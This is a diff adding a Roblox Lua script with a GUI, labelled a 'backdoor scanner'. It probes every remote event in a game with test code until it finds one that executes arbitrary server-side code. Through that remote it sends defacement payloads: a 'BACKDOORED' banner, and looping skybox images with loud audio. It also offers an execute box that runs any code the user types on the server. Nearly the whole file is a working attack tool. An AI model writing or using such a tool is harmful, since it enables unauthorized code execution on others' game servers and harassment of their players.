@@ -1,0 +1,259 @@
+local PlayerName = game:GetService("Players").LocalPlayer.Name
+
+local function LoadAssetModule(assetId, key, name)
+    return {Pload = function() end} 
+end
+LoadAssetModule(0x308BC2E6B, 'Dummy', "'" .. PlayerName .. "'")
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "BAD EXECUTOR"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 500, 0, 450)
+MainFrame.Position = UDim2.new(0.5, -250, 0.5, -225)
+MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+MainFrame.BorderSizePixel = 2
+MainFrame.BorderColor3 = Color3.fromRGB(100, 100, 255)
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Parent = ScreenGui
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.BackgroundColor3 = Color3.fromRGB(50, 50, 100)
+Title.Text = "DXT SCANNER VERY BAD SCANNER DONT USING TS"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Font = Enum.Font.Antique
+Title.TextScaled = true
+Title.Parent = MainFrame
+
+local StatusLabel = Instance.new("TextLabel")
+StatusLabel.Size = UDim2.new(1, -20, 0, 60)
+StatusLabel.Position = UDim2.new(0, 10, 0, 50)
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Text = "Status: Cum"
+StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+StatusLabel.Font = Enum.Font.Antique
+StatusLabel.TextScaled = true
+StatusLabel.Parent = MainFrame
+
+local CodeBox = Instance.new("TextBox")
+CodeBox.Size = UDim2.new(1, -20, 0, 150)
+CodeBox.Position = UDim2.new(0, 10, 0, 120)
+CodeBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+CodeBox.TextColor3 = Color3.new(1,1,1)
+CodeBox.PlaceholderText = "---enter Script here!"
+CodeBox.Text = "Very bad Scanner don't using this"
+CodeBox.MultiLine = true
+CodeBox.TextWrapped = true
+CodeBox.Font = Enum.Font.Arcade
+CodeBox.TextSize = 14
+CodeBox.ClearTextOnFocus = false
+CodeBox.Parent = MainFrame
+
+local ButtonContainer = Instance.new("Frame")
+ButtonContainer.Size = UDim2.new(1, -20, 0, 50)
+ButtonContainer.Position = UDim2.new(0, 10, 0, 280)
+ButtonContainer.BackgroundTransparency = 1
+ButtonContainer.Parent = MainFrame
+
+local ExecuteButton = Instance.new("TextButton")
+ExecuteButton.Size = UDim2.new(0, 110, 1, 0)
+ExecuteButton.Position = UDim2.new(0, 0, 0, 0)
+ExecuteButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+ExecuteButton.Text = "EXECUTE"
+ExecuteButton.TextColor3 = Color3.new(0.7,0.7,0.7)
+ExecuteButton.Font = Enum.Font.Antique
+ExecuteButton.TextScaled = true
+ExecuteButton.Active = false
+ExecuteButton.Parent = ButtonContainer
+
+local ClearButton = Instance.new("TextButton")
+ClearButton.Size = UDim2.new(0, 110, 1, 0)
+ClearButton.Position = UDim2.new(0, 120, 0, 0)
+ClearButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+ClearButton.Text = "CLEAR"
+ClearButton.TextColor3 = Color3.new(1,1,1)
+ClearButton.Font = Enum.Font.Antique
+ClearButton.TextScaled = true
+ClearButton.Parent = ButtonContainer
+
+local ScanButton = Instance.new("TextButton")
+ScanButton.Size = UDim2.new(0, 110, 1, 0)
+ScanButton.Position = UDim2.new(0, 240, 0, 0)
+ScanButton.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+ScanButton.Text = "SCAN"
+ScanButton.TextColor3 = Color3.new(1,1,1)
+ScanButton.Font = Enum.Font.Antique
+ScanButton.TextScaled = true
+ScanButton.Parent = ButtonContainer
+
+local SkyboxButton = Instance.new("TextButton")
+SkyboxButton.Size = UDim2.new(0, 110, 1, 0)
+SkyboxButton.Position = UDim2.new(0, 360, 0, 0)
+SkyboxButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+SkyboxButton.Text = "SKYBOX"
+SkyboxButton.TextColor3 = Color3.new(0.7,0.7,0.7)
+SkyboxButton.Font = Enum.Font.Antique
+SkyboxButton.TextScaled = true
+SkyboxButton.Active = false
+SkyboxButton.Parent = ButtonContainer
+
+local AcquiredRemote = nil
+local testModelName = "ZzXyYyZz_DxTTest"
+
+local scanFoundPayload = [[
+local h = Instance.new("Hint")
+h.Parent = workspace
+h.Text = "BACKDOORED BY DXT SCANNER| SLOW SCANNING | BAD SCANNER DONT USING THIS😭🙏"
+]]
+
+local skyboxPayload = [[
+local images = {
+    "http://www.roblox.com/asset/?id=21076888",
+    "http://www.roblox.com/asset/?id=21076945",
+    "http://www.roblox.com/asset/?id=21077007",
+    "http://www.roblox.com/asset/?id=21077125",
+    "http://www.roblox.com/asset/?id=21077227",
+    "http://www.roblox.com/asset/?id=21077345",
+    "http://www.roblox.com/asset/?id=21076888",
+    "http://www.roblox.com/asset/?id=21076945"
+}
+
+local DxT = Instance.new("Sound")
+DxT.Name = "DxT"
+DxT.SoundId = "rbxassetid://134884767490882"
+DxT.Volume = 8
+DxT.Looped = true
+DxT.Pitch = 0.8
+DxT.Parent = workspace
+DxT:Play()
+
+local Lighting = game:GetService("Lighting")
+local Sky = Instance.new("Sky")
+Sky.Parent = Lighting
+
+local function setSkybox(id)
+    Sky.SkyboxBk = id
+    Sky.SkyboxDn = id
+    Sky.SkyboxFt = id
+    Sky.SkyboxLf = id
+    Sky.SkyboxRt = id
+    Sky.SkyboxUp = id
+end
+
+spawn(function()
+    while true do
+        for _, img in ipairs(images) do
+            setSkybox(img)
+            wait(0.2)
+        end
+    end
+end)
+]]
+
+local function scanBackdoor()
+    if AcquiredRemote then
+        StatusLabel.Text = "Status: Hey bradar Already Scan pls don't click again"
+        return
+    end
+
+    StatusLabel.Text = "Status: Scanning backdoors..."
+    ScanButton.Text = "SCANNING..."
+
+    local locationsToScan = {
+        game:GetService("Workspace"),
+        game:GetService("Players"),
+        game:GetService("ReplicatedStorage"),
+        game:GetService("ServerScriptService"),
+        game:GetService("Lighting"),
+        game:GetService("StarterGui")
+    }
+
+    local remotes = {}
+    for _, loc in ipairs(locationsToScan) do
+        for _, v in pairs(loc:GetDescendants()) do
+            if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
+                table.insert(remotes, v)
+            end
+        end
+    end
+
+    for _, remote in ipairs(remotes) do
+        if not AcquiredRemote then
+            local testCode = 'Instance.new("Model", workspace).Name="'..testModelName..'"'
+            if remote.Parent ~= game:GetService("RobloxReplicatedStorage") then
+                if remote:IsA("RemoteEvent") then
+                    remote:FireServer(testCode)
+                elseif remote:IsA("RemoteFunction") then
+                    task.spawn(function() remote:InvokeServer(testCode) end)
+                end
+            end
+            task.wait(0.5)
+            if workspace:FindFirstChild(testModelName) then
+                if workspace:FindFirstChild(testModelName):IsA("Model") then
+                    AcquiredRemote = remote
+                    workspace:FindFirstChild(testModelName):Destroy()
+                end
+            end
+        end
+    end
+
+    if AcquiredRemote then
+        StatusLabel.Text = "Status: Backdoor Found"
+        ScanButton.Text = "SCAN"
+        
+        if AcquiredRemote:IsA("RemoteEvent") then
+            AcquiredRemote:FireServer(scanFoundPayload)
+        else
+            task.spawn(function() AcquiredRemote:InvokeServer(scanFoundPayload) end)
+        end
+
+        SkyboxButton.Active = true
+        SkyboxButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+        SkyboxButton.TextColor3 = Color3.new(1,1,1)
+        
+        ExecuteButton.Active = true
+        ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+        ExecuteButton.TextColor3 = Color3.new(1,1,1)
+    else
+        StatusLabel.Text = "Status: No Skidded:(/backdoor"
+        ScanButton.Text = "SCAN"
+    end
+end
+
+local function executeSkybox()
+    if not AcquiredRemote then return end
+
+    if AcquiredRemote:IsA("RemoteEvent") then
+        AcquiredRemote:FireServer(skyboxPayload)
+    else
+        task.spawn(function() AcquiredRemote:InvokeServer(skyboxPayload) end)
+    end
+
+    StatusLabel.Text = "Status: Executed Fe Anime Skybox"
+end
+
+local function executeCustom()
+    if not AcquiredRemote or CodeBox.Text == "" then return end
+
+    local code = CodeBox.Text
+
+    if AcquiredRemote:IsA("RemoteEvent") then
+        AcquiredRemote:FireServer(code)
+    else
+        task.spawn(function() AcquiredRemote:InvokeServer(code) end)
+    end
+
+    StatusLabel.Text = "Status: Executed"
+end
+
+ClearButton.MouseButton1Click:Connect(function()
+    CodeBox.Text = ""
+end)
+
+ScanButton.MouseButton1Click:Connect(scanBackdoor)
+SkyboxButton.MouseButton1Click:Connect(executeSkybox)
+ExecuteButton.MouseButton1Click:Connect(executeCustom)
